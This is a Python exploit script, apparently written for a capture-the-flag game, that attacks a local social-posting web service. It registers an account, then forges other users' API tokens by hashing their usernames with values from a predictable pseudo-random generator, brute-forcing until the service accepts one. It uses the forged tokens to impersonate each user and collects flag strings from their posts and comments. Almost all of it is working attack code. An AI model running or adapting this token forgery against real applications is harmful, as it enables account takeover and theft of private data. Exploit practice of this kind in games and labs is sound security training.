#!/usr/bin/env python3

import sys
import requests
import hashlib
import re
from random import choice


alph_full = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
alph_caps = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
names = ['goliath', 'royal', 'dacota', 'marry', 'hunter', 'twilight' ,'smile' ,'castle', 'lucky', 'Wilson', 'Johanna', 'Willow', 'Wigfrid', 'Wendy', 'Wolfgang', 'Wes', 'Webber', 'Woody']
FlagRegExp = re.compile(r'[A-Za-z0-9]{31}=')

#ip = sys.argv[1]
ip = '127.0.0.1'
port = '1337'
host = f'{ip}:{port}'


def id_gen( size = 10, first = names, next = alph_full ) -> str:
	beg = choice(first)
	return  beg + ''.join(choice(next) for i in range(size - len(beg)))


def main():

	flags = ''

	u_name = id_gen(next=alph_caps)
	passwd = id_gen(first=alph_full)
		
	sess = register( u_name, passwd )

	token = get_token( sess )

	last_barks_ids = last_barks(sess, 0, token)

	viewed_bark = -1

	generator = gsch()

	for user in last_users( sess, 0, token )[::-1]:

		hack_token = generate_token( user, str(next(generator)) )

		html = sess.get( f'http://{host}/api/', headers={"Token":hack_token} ).text
		while "id" not in html:
			sch = str(next(generator))
			hack_token = generate_token( user, sch )
			html = sess.get( f'http://{host}/api/', headers={"Token":hack_token} ).text

		#print( html )

		#print( view_barks(sess, user, hack_token) )
		for flag in view_barks( sess, user, hack_token ):

			flags += flag + '\n'
		
		for b_id in last_barks_ids:
			#print( view_comments( sess, b_id, hack_token ) )
			for flag in view_comments( sess, b_id, hack_token ):

				flags += flag + '\n'

				viewed_bark = b_id

		if viewed_bark in last_barks_ids:
			last_barks_ids.remove(viewed_bark)
		
	print( flags, flush=True )


def generate_token( u_name:str, word:str ) -> str:
    value = hashlib.md5(f"{u_name}{word}".encode()).hexdigest()
    return value


def gsch():
    state = [24432, 0]
    while True:
        n = ""
        for _ in range(32):
            s = bin(state[0] & 214748361).count("1") + state[1]
            state[0] = (state[0] >> 1) | ((s & 1) << 8)
            state[1] = s >> 1
            n += str(state[0] & 1)
        yield int(n, base=2)


def get_token( s ) -> str:
		#http://127.0.0.1:1337/generate_token/ | GET
		html = s.get( f'http://{host}/generate_token/' ).text
		return re.findall( r"<h5>(\w{32})</h5>", html )[0]


def register( u_name:str, passwd:str ):
	#name="csrfmiddlewaretoken" value="gV...7"
	#http://127.0.0.1:1337/signup/ | POST | csrfmiddlewaretoken=8...D&username=1&password=1&fname=&lname=
	s = requests.session()
	html = s.get(f'http://{host}/signup/').text
	csrf = re.findall( 'name="csrfmiddlewaretoken" value="(\w+)"', html )[0]
	html = s.post(f'http://{host}/signup/', data={
		'csrfmiddlewaretoken':csrf, 
		'username':u_name, 
		'password':passwd, 
		'fname':'', 
		'lname':''
	}).text
	return s


def view_comments( s, b_id, token:str ) -> list:
	#http://127.0.0.1:1337/api/users/<int:page_n>/	
	html = s.get( f'http://{host}/api/comments/{b_id}/', headers={"Token":token} ).text
	return FlagRegExp.findall( html )


def view_barks( s, u_name:str, token:str ) -> list:
	#http://127.0.0.1:1337/api/barks/<str:username>/
	html = s.get( f'http://{host}/api/barks/{u_name}/', headers={"Token":token} ).text
	return FlagRegExp.findall( html )


def last_barks( s, p_id, token:str ) -> list:
	#http://127.0.0.1:1337/api/users/<int:page_n>/	
	html = s.get( f'http://{host}/api/last_barks/{p_id}/', headers={"Token":token} ).text
	return re.findall( '"id": (\d+),', html )


def last_users( s, p_id, token:str ) -> list:
	#http://127.0.0.1:1337/api/users/<int:page_n>/	
	html = s.get( f'http://{host}/api/users/{p_id}/', headers={"Token":token} ).text
	return re.findall( '"username": "(\w+)"', html )


if __name__ == '__main__':
	main()